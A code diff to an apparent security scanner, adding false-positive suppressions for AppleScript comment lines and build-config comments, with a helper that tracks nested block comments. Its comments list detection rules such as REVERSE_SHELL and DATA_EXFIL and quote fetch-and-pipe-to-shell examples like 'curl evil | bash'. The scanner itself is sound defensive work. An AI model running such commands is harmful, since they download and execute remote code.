@@ -849,6 +849,93 @@ def _is_in_line_comment(line: str, file_path: str) -> bool:
     return False
 
 
+# AppleScript file extensions (issue #70-B class 3). `.scpt` is the compiled
+# form; CPV only scans the text source `.applescript` / `.scptd` plist, but the
+# extension list is kept inclusive so the comment carve-out applies to any of
+# them if scanned as text. PUBLIC (no underscore) — `validate_security.py`'s
+# supply-chain scanner imports it so the AppleScript-comment carve-out is
+# single-sourced across both scan paths (skillaudit + RC supply-chain).
+APPLESCRIPT_EXTS: tuple[str, ...] = (".applescript", ".scpt", ".scptd")
+
+
+def applescript_comment_lines(lines: list[str]) -> frozenset[int]:
+    """Return the set of 0-based line indices that are AppleScript COMMENT
+    lines (issue #70-B class 3).
+
+    AppleScript comment forms:
+      * ``--`` to end of line — line comment.
+      * ``#`` to end of line — line comment (AppleScript 2.0+, shebang form).
+      * ``(* … *)`` — block comment, may span lines and MAY NEST.
+
+    A line index is included when the line is ENTIRELY inside a block comment,
+    or its first non-blank token opens a ``--`` / ``#`` line comment, or it
+    opens/continues a ``(*`` block. Conservative: a line that has executable
+    code BEFORE a trailing ``--``/``(*`` is NOT a comment line (a real
+    ``do shell script "…" -- note`` must still fire on the code part), so we
+    only mark a line as comment when it STARTS as a comment or sits wholly
+    within an open block.
+
+    Nesting depth is tracked across lines so ``(* outer (* inner *) still
+    open *)`` is handled. This is a demote/suppress heuristic, not a parser:
+    it ignores ``(*``/``*)`` that appear inside string literals (rare in real
+    AppleScript and harmless to over-count as a comment, since the carve-out
+    only suppresses inert execution-class rules on these lines).
+    """
+    comment_idx: set[int] = set()
+    depth = 0  # open ``(*`` block-comment nesting depth
+    for i, raw in enumerate(lines):
+        if depth > 0:
+            # Already inside an open block comment — this whole line is comment
+            # until the block closes. Walk it to update depth (handles a line
+            # that closes the block and possibly re-opens another).
+            comment_idx.add(i)
+            depth = _applescript_block_depth(raw, depth)
+            continue
+        stripped = raw.lstrip()
+        if not stripped:
+            continue
+        # A line that STARTS with a line-comment marker is a comment line.
+        if stripped.startswith(("--", "#")):
+            comment_idx.add(i)
+            continue
+        # A line that STARTS with a block-comment open is a comment line; track
+        # whether the block stays open past end-of-line.
+        if stripped.startswith("(*"):
+            comment_idx.add(i)
+            depth = _applescript_block_depth(stripped, 0)
+            continue
+        # Otherwise: executable code (possibly with a trailing comment). Not a
+        # whole-line comment — leave it unmarked so code parts still fire. But
+        # still update depth in case the line OPENS a block comment after code
+        # (e.g. ``set x to 1 (* note`` — rare; the block then covers later
+        # lines, but THIS line keeps its code visible).
+        depth = _applescript_block_depth(raw, 0)
+    return frozenset(comment_idx)
+
+
+def _applescript_block_depth(text: str, start_depth: int) -> int:
+    """Return the ``(*``/``*)`` nesting depth at the END of ``text`` given the
+    depth at its start. Each ``(*`` increments, each ``*)`` decrements (floored
+    at 0). Used by `applescript_comment_lines` to track multi-line block
+    comments across line boundaries.
+    """
+    depth = start_depth
+    i = 0
+    n = len(text)
+    while i < n - 1:
+        pair = text[i : i + 2]
+        if pair == "(*":
+            depth += 1
+            i += 2
+            continue
+        if pair == "*)":
+            depth = max(0, depth - 1)
+            i += 2
+            continue
+        i += 1
+    return depth
+
+
 def _is_substring_false_positive(line: str, match: str) -> bool:
     """True when `match` appears in `line` as a strict substring of a
     longer alphanumeric token (no word boundary on at least one side).
@@ -945,6 +1032,60 @@ _EXECUTION_CLASS_RULES: frozenset[str] = frozenset(
 # NET_SUSPICIOUS / DATA_EXFIL / URL_SUSPICIOUS stay live in a stylesheet.
 _STYLE_LANG_EXTS: tuple[str, ...] = (".css", ".scss", ".sass", ".less")
 _STYLE_LANG_INERT_EXEC_RULES: frozenset[str] = frozenset(
+    {
+        "CMD_INJECTION",
+        "SHELL_EXEC",
+        "REVERSE_SHELL",
+        "PRIVILEGE_ESC",
+        "CONTAINER_ESCAPE",
+        "PERSISTENCE",
+        "TIME_BOMB",
+        "SUPPLY_CHAIN",
+    }
+)
+
+# Build-config file extensions (issue #70-B class 1). A `.toml` / `.ini` /
+# `.cfg` / `.cnf` / `.conf` file is BUILD/TOOL CONFIGURATION — read by a build
+# tool (ruff / pip / setuptools / pytest / a linter), NEVER loaded by Claude
+# Code as agent instructions. A natural-language *prompt-injection* phrase in a
+# COMMENT of such a file therefore cannot reach an agent: there is no pipeline
+# that feeds a `pyproject.toml` comment to the model as instructions. (Reported:
+# a `# Tests use non-ASCII chars intentionally` comment in a `pyproject.toml`
+# `[tool.ruff.lint.per-file-ignores]` block fired INDIRECT_PROMPT_INJECT,
+# demoted to a publish-blocking NIT under --strict.)
+_BUILD_CONFIG_EXTS: tuple[str, ...] = (".toml", ".ini", ".cfg", ".cnf", ".conf")
+
+# Natural-language instruction-injection rules whose threat is delivered THROUGH
+# prose the agent reads as instructions. These — and ONLY these — are inert in a
+# build-config COMMENT (the carve-out above). Deliberately EXCLUDES:
+#   * hidden-content / steganographic rules (INVISIBLE_UNICODE_RAW, *_DECODE_*) —
+#     a config fed to an LLM for summarisation would still surface hidden bytes;
+#   * secret rules (HARDCODED_SECRET / SECRET_*) — a real key in a config comment
+#     is still a committed leak GitHub's scanner revokes;
+#   * execution-class rules (CMD_INJECTION / SUPPLY_CHAIN / SHELL_EXEC / …) — a
+#     config VALUE that a hook runs (`[tool.x] command = "curl evil | bash"`) is
+#     a NON-comment line and stays fully live.
+# So the carve-out clears ONLY the prose-instruction FP, never a real threat.
+_PROSE_INJECTION_RULES: frozenset[str] = frozenset(
+    {
+        "PROMPT_INJECT",
+        "INDIRECT_PROMPT_INJECT",
+        "INTENT_INSTRUCTION_OVERRIDE",
+        "INTENT_AGENT_MANIPULATION",
+    }
+)
+
+# OS-execution / install rules that are INERT inside an AppleScript COMMENT
+# (issue #70-B class 3). Unlike CSS — where the WHOLE language cannot run a
+# shell — AppleScript CAN execute a shell command, but ONLY via a real
+# statement (`do shell script "…"` / Terminal `do script "…"`). A
+# CMD_INJECTION / SUPPLY_CHAIN / shell match inside a ``--`` / ``#`` / ``(* *)``
+# comment cannot execute, so it is suppressed there. FN-safe and NARROW: the
+# suppression is gated on the line being a comment (`applescript_comment_lines`)
+# — a genuine `do shell script "curl … | sh"` is NOT a comment line and stays
+# fully live. Network/exfil/secret/prose rules are deliberately NOT in this set,
+# matching the CSS carve-out's scope.
+_APPLESCRIPT_COMMENT_INERT_RULES: frozenset[str] = frozenset(
     {
         "CMD_INJECTION",
         "SHELL_EXEC",
@@ -1471,6 +1612,38 @@ def _context_classifier_verdict(
     # `@import` network/exfil rules are NOT in the set, so they stay live here.
     if rule_id in _STYLE_LANG_INERT_EXEC_RULES and fp_lower.endswith(_STYLE_LANG_EXTS):
         return "suppress"
+    # Build-config COMMENT → prose-injection carve-out (issue #70-B class 1). A
+    # `.toml` / `.ini` / `.cfg` / `.cnf` / `.conf` file is BUILD/TOOL config,
+    # read by a build tool and NEVER loaded by Claude Code as agent
+    # instructions. A natural-language prompt-injection rule (`_PROSE_INJECTION_RULES`)
+    # firing in a COMMENT line of such a file is categorically a FP — there is
+    # no pipeline that feeds the comment to the model as instructions. (Reported:
+    # `# Tests use non-ASCII chars intentionally` in a `pyproject.toml`
+    # `[tool.ruff.lint.per-file-ignores]` block fired INDIRECT_PROMPT_INJECT,
+    # demoted to a publish-blocking NIT.) FN-safe: ONLY prose-injection rules
+    # are cleared (execution-class CMD_INJECTION / SUPPLY_CHAIN on a config VALUE
+    # a hook runs, hidden-Unicode / decode rules, and secret rules are NOT in
+    # the set and stay fully live), and ONLY on a comment line (`#` opener — the
+    # universal `.toml`/`.ini`/`.cfg`/`.conf` comment marker).
+    if (
+        rule_id in _PROSE_INJECTION_RULES
+        and fp_lower.endswith(_BUILD_CONFIG_EXTS)
+        and 0 <= line_idx < len(lines)
+        and lines[line_idx].lstrip().startswith("#")
+    ):
+        return "suppress"
+    # AppleScript COMMENT → execution-class carve-out (issue #70-B class 3).
+    # AppleScript runs a shell ONLY via a real `do shell script` / `do script`
+    # statement; an OS-execution / install rule (`_APPLESCRIPT_COMMENT_INERT_RULES`)
+    # matched inside a `--` / `#` / `(* *)` COMMENT cannot execute. (Reported: a
+    # comment referencing `$ITERM_SESSION_ID` / `curl … | sh` in
+    # `open_preview.applescript` — a script that only iterates iTerm windows to
+    # find a session — fired CRITICAL CMD_INJECTION + SUPPLY_CHAIN.) FN-safe and
+    # NARROW: suppression is gated on the line being a comment, so a genuine
+    # `do shell script "curl … | sh"` is NOT a comment line and stays live.
+    if rule_id in _APPLESCRIPT_COMMENT_INERT_RULES and fp_lower.endswith(APPLESCRIPT_EXTS):
+        if line_idx in applescript_comment_lines(lines):
+            return "suppress"
     # Point 1 (v2.114.0): an extension-less script (git hook, configure,
     # runme) reaches here with no classifier-recognised extension. The
     # per-language classifiers dispatch AND internally gate on the file
